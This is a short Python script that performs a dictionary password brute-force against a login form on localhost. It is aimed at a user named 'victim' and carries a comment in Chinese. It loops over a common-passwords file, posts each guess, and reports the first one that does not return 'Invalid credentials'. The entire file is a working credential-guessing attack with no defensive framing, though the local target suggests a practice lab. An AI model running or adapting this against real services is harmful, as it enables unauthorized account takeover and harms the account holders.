import requests

url = "http://127.0.0.1:5000/login"
username = "victim"  # 目标账号

with open("common_passwords.txt", "r") as f:
    for line in f:
        pwd = line.strip()
        data = {
            "username": username,
            "password": pwd
        }
        response = requests.post(url, data=data)
        # Determine whether the login failed based on the returned page content
        if "Invalid credentials" not in response.text:
            print(f"[+] Found valid password: {pwd}")
            break